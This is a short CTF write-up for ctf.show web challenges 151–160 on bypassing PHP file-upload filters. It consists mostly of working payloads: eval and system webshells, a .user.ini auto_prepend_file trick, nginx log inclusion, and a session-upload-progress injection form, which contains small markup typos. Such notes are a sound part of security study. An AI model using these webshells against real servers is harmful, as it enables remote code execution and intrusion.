
---
web151

```
	js绕过
```
web152

```
	MIME类型绕过
```

web153
```
	同级目录有php文件 。.user.ini绕过
```

web154-155
内容过滤php

内容php大小写绕过
```
或者<?=eval($_POST[a])?>
```

web156
```
过滤php 和 []

{} 代替 []
```

web157-158
基本上把马锁死，但是还是可以任意执行php代码
```
<? system('tac fla*') ?>
```

web159

```
过滤 () [] {} ; php
```

```
反引号执行命令
<?=`tac fla*`?>
```

web160

```
过滤 () [] {} ; php `` 空格 log
对文件头部进行检测
```

```
.user.ini

GIF89a
auto_prepend_file =getshell.png

getshell.png

GIF89a
<?=include"/var/lo"."g/nginx/access.lo"."g"?>

用"."分隔log
```

```html
  
<!DOCTYPE html>
<html>
<body>
<form action="http://78c48379-27b6-4a04-ac10-07c787b030d4.challenge.ctf.show/" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php system('tac ../f*')?>");?>" />
    <input type="file" name="file" />
    <input type="submit" value="submit" />
</form1
</body>
</html>
```